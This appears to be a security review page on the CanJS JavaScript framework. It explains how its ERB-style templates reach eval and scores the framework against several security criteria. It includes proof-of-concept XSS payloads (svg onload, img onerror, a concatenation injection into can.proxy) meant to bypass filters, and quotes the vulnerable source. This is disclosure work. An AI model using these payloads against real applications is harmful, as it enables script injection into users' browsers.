

# Introduction #

"Want to share code between a Zepto mobile app and a jQuery desktop app? No problem. CanJS code (especially models) can be shared across libraries, and so can skill sets! Working on a Dojo project today and a YUI one tomorrow? Don’t throw away all of your skills."

From http://canjs.com/guides/Why.html

# Quick Facts #

  * [CanJS 1.1.6 (Uncompressed)](http://canjs.com/release/1.1.6/can.jquery.js)
  * [CanJS 2.0.3 (Uncompressed)](http://canjs.com/release/2.0.3/can.jquery.js)
  * Usage Stats http://trends.builtwith.com/framework/CanJS

  * **{}SEC-A** <font color='red'><b>FAIL</b></font> Template expressions are equivalent to `eval`
  * **{}SEC-B** <font color='red'><b>FAIL</b></font> No sandbox or isolated execution scope
  * **{}SEC-C** <font color='green'><b>PASS</b></font> Only `SCRIPT` elements with proper type can serve as template containers
  * **{}SEC-D** <font color='red'><b>FAIL</b></font> No enforced separation, no obvious way to outsource templates to static files
  * **{}SEC-E** <font color='red'><b>FAIL</b></font> No dedicated security response program, no security@canjs.com address

# Injection Attacks #

CanJS uses ERB-style templates by default. Everything that is placed in-between the `<%` and `%>` or its siblings is being treated as raw JavaScript. CanJS throws the content of the ERB-style templates into an actual `eval` method - that is called `myEval` but doesn't do anything but wrapping the real `eval`.

In other words: whenever the user has control over content of the ERB-style template blocks, script injections and XSS are very much likely. The "paste-and-go" code example below shows several cases an attacker can use to bypass server- and browser side XSS filters in case the attacked CanJS application allows injections.

```
<script src="http://code.jquery.com/jquery-2.0.3.min.js"></script>
<script src="http://canjs.us/release/latest/can.jquery.js"></script> 
<script src="http://canjs.us/release/latest/can.construct.proxy.js"></script> 
<script src="http://canjs.us/release/latest/can.control.plugin.js"></script> 
<script src="http://canjs.us/release/latest/can.observe.attributes.js"></script> 
<script src="http://canjs.us/release/latest/can.observe.backup.js"></script> 
<script src="http://canjs.us/release/latest/can.observe.delegate.js"></script> 
<script src="http://canjs.us/release/latest/can.observe.setter.js"></script> 
<script src="http://canjs.us/release/latest/can.observe.validations.js"></script> 
<script src="http://canjs.us/release/latest/can.view.modifiers.js"></script> 
<script src="http://canjs.us/release/latest/can.fixture.js"></script> 
<script src="http://canjs.us/release/latest/can.view.mustache.js"></script> 
<script src="http://canjs.us/release/latest/can.construct.super.js"></script> 

<body>
    <script type="text/ejs" id="todoList">
        <% alert(0) %>
	<svg class=<%= '1\x20onload\x3Dalert(1)' %>>
	<img src="x"<%=onerror=function(){alert(2)} %>>
	<%== '\x3Cimg src=x onerror=alert(3)>' %>
	<%%= '<img src=x onerror=alert(4)>' %>
    </script>
    <script>
	can.view('todoList', {});
    </script>
</body>
```

Another injection problem can be abused by using a concatenation feature that will be discussed later on this page.

```
<script src="http://code.jquery.com/jquery-2.0.3.min.js"></script>
<script src="http://canjs.us/release/latest/can.jquery.js"></script> 

<body>
    <script type="text/ejs" id="todoList">
        <%==($a)->abc})-alert(1)-can.proxy(function(){%>
    </script>
    <script>
    can.view('todoList', {});
    </script>
</body>
```

Now, how do these work internally?

## Eval via myEval ##

CanJS takes it easy and simply throws the extracted template data into a string, wrapped by a bunch of `with()` blocks and afterwards sends it to an `eval`. That's all.

```
myEval = function(script) {
    eval(script);
}, 

[...]

var template = buff.join(''), 
out = {
    out: 'with(_VIEW) { with (_CONTEXT) {' + template + " " + finishTxt + "}}"
};
// Use `eval` instead of creating a function, because it is easier to debug.
myEval.call(out, 'this.fn = (function(_CONTEXT,_VIEW){' + out.out + '});\r\n//@ sourceURL=' + name + ".js");
                
return out;
```

## Eval via string.concatenated code in Scanner.helpers.fn() ##

CanJS shows no mercy when coming to quirky injection sinks. Aside from the aforementioned `eval` via `myEval`, CanJS also allows to inject code into a string-concatenated call against `can.proxy()` - that is later being evaluated.

```
        Scanner.prototype = {

            helpers: [

                {
                    name: /\s*\(([\$\w]+)\)\s*->([^\n]*)/,
                    fn: function(content) {
                        var quickFunc = /\s*\(([\$\w]+)\)\s*->([^\n]*)/,
                            parts = content.match(quickFunc);

                        return "can.proxy(function(__){var " + parts[1] + "=can.$(__);" + parts[2] + "}, this);";
                    }
                }
            ],
```